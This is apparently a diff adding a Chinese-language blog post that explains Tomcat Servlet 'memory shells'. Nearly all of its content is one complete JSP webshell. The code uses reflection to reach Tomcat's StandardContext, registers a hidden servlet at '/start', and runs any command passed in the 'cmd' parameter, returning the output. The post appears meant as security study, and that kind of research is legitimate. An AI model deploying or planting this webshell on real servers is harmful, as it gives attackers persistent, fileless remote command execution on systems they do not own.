@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <title>Blog Of SEVENTEEN</title>
+
+    <link rel = "Shortcut Icon" href="../img/favicon.ico">
+
+    <!-- Bootstrap core CSS -->
+    <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Custom fonts for this template -->
+    <link href="../vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
+    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet'
+          type='text/css'>
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800'
+          rel='stylesheet' type='text/css'>
+
+    <!-- Custom styles for this template -->
+    <link href="../css/clean-blog.min.css" rel="stylesheet">
+
+    <!-- Code highlight-->
+    <link rel="stylesheet" href="../highlight/styles/ashes.min.css">
+    
+    <!-- fancybox-->
+    <link  href="../css/jquery.fancybox.min.css" rel="stylesheet">
+    
+
+</head>
+
+<body>
+
+<!-- Navigation -->
+<nav class="navbar navbar-expand-lg navbar-light fixed-top" id="mainNav">
+    <div class="container">
+        <a class="navbar-brand" href="../index.html">Index</a>
+        <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse"
+                data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false"
+                aria-label="Toggle navigation">
+            Menu
+            <i class="fas fa-bars"></i>
+        </button>
+        <div class="collapse navbar-collapse" id="navbarResponsive">
+            <ul class="navbar-nav ml-auto">
+                <li class="nav-item">
+                    <a class="nav-link" href="../index.html">Home</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../about.html">About</a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../contact.html">Contact</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+
+<!-- Page Header -->
+<header class="masthead" style="background-image: url('../img/post-bg.jpeg')">
+    <div class="overlay"></div>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <div class="post-heading">
+                    <h1>浅析Tomcat Servlet内存马原理</h1>
+                    <h2 class="subheading">浅析Tomcat Servlet内存马原理</h2>
+                    <span class="meta">Posted by
+              <a href="#">SEVENTEEN</a>
+              on March 22, 2022</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+
+                <h2 class="section-heading">前言</h2>
+
+                <p>&nbsp;&nbsp;&nbsp;关于Listener,Filter,Servlet在前文中已经有所了解，这次来看一下跟Filter型内存马差不多的Servlet型的jsp内存马是怎么实现的。</p>
+                	
+              
+              
+                <h2 class="section-heading">Tomcat Servlet内存马</h2>
+                
+                <p>&nbsp;&nbsp;&nbsp;首先是通过反射获取上下文，之后创建Wrapper，将恶意的Servlet放入。
+                再配置ServletMap映射路由即可。</p>
+                
+
+								<div>
+									
+<pre class='hljs'><code>&lt;%@ page contentType=<span class="hljs-string">"text/html;charset=UTF-8"</span> language=<span class="hljs-string">"java"</span> %&gt;
+&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"org.apache.catalina.core.ApplicationContext"</span> %&gt;
+&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"org.apache.catalina.core.StandardContext"</span> %&gt;
+&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"javax.servlet.*"</span> %&gt;
+&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.io.IOException"</span> %&gt;
+&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.lang.reflect.Field"</span> %&gt;
+&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.io.BufferedReader"</span> %&gt;
+&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"java.io.InputStreamReader"</span> %&gt;
+&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">"org.apache.catalina.Wrapper"</span> %&gt;
+
+
+&lt;%
+    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ServletDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Servlet</span> </span>{
+        <span class="hljs-annotation">@Override</span>
+        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">(ServletConfig config)</span> <span class="hljs-keyword">throws</span> ServletException </span>{
+        }
+
+        <span class="hljs-annotation">@Override</span>
+        <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getServletInfo</span><span class="hljs-params">()</span> </span>{
+            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
+        }
+
+        <span class="hljs-annotation">@Override</span>
+        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>{
+        }
+
+        <span class="hljs-function"><span class="hljs-keyword">public</span> ServletConfig <span class="hljs-title">getServletConfig</span><span class="hljs-params">()</span> </span>{
+            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;
+        }
+
+        <span class="hljs-comment">// 每次请求该servlet都会执行该方法</span>
+        <span class="hljs-annotation">@Override</span>
+        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">service</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>{
+            String cmd = servletRequest.getParameter(<span class="hljs-string">"cmd"</span>);
+            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-keyword">null</span>) {
+                Process process = Runtime.getRuntime().exec(cmd);
+                BufferedReader bufferedReader = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> InputStreamReader(process.getInputStream()));
+                StringBuilder stringBuilder = <span class="hljs-keyword">new</span> StringBuilder();
+                String line;
+                <span class="hljs-keyword">while</span> ((line = bufferedReader.readLine()) != <span class="hljs-keyword">null</span>) {
+                    stringBuilder.append(line + <span class="hljs-string">'\n'</span>);
+                }
+                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
+                servletResponse.getOutputStream().flush();
+                servletResponse.getOutputStream().close();
+                <span class="hljs-keyword">return</span>;
+            }
+        }
+    }
+%&gt;
+
+&lt;%
+    <span class="hljs-comment">// 反射获取context</span>
+    ServletContext servletContext = request.getSession().getServletContext();
+
+    Field appctx = servletContext.getClass().getDeclaredField(<span class="hljs-string">"context"</span>);
+    appctx.setAccessible(<span class="hljs-keyword">true</span>);
+
+    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
+
+    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="hljs-string">"context"</span>);
+    stdctx.setAccessible(<span class="hljs-keyword">true</span>);
+
+    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
+
+    ServletDemo demo = <span class="hljs-keyword">new</span> ServletDemo();
+    Wrapper demoWrapper = standardContext.createWrapper();
+
+    <span class="hljs-comment">// 设置Servlet名</span>
+    demoWrapper.setName(<span class="hljs-string">"start"</span>);
+    demoWrapper.setLoadOnStartup(<span class="hljs-number">1</span>);
+    demoWrapper.setServlet(demo);
+    demoWrapper.setServletClass(demo.getClass().getName());
+    standardContext.addChild(demoWrapper);
+
+    <span class="hljs-comment">// 设置ServletMap</span>
+    standardContext.addServletMappingDecoded(<span class="hljs-string">"/start"</span>, <span class="hljs-string">"start"</span>);
+    System.out.println(<span class="hljs-string">"inject servlet success!"</span>);
+%&gt;</code></pre>
+									
+								</div>
+              
+              
+           
+                <h2 class="section-heading">There Is Nothing Below</h2>
+                <p>&nbsp;&nbsp;&nbsp;</p>
+
+                <a href="#">
+                    <img class="img-fluid" src="../img/post-bg.jpeg" alt="">
+                </a>
+                <span class="caption text-muted">Turn at the next intersection.</span>
+
+                <blockquote class="blockquote">
+                </blockquote>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<hr>
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <ul class="list-inline text-center">
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-facebook-f fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="#">
+                <span class="fa-stack fa-lg">
+                  <i class="fas fa-circle fa-stack-2x"></i>
+                  <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+                        </a>
+                    </li>
+                </ul>
+                <p class="copyright text-muted">Copyright &copy; SEVENTEEN 2022</p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- Bootstrap core JavaScript -->
+<script src="../vendor/jquery/jquery.min.js"></script>
+<script src="../vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+
+<!-- Custom scripts for this template -->
+<script src="../js/clean-blog.min.js"></script>
+
+<script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+<script src="../js/jquery.fancybox.min.js"></script>
+                  
+</body>
+
+</html>
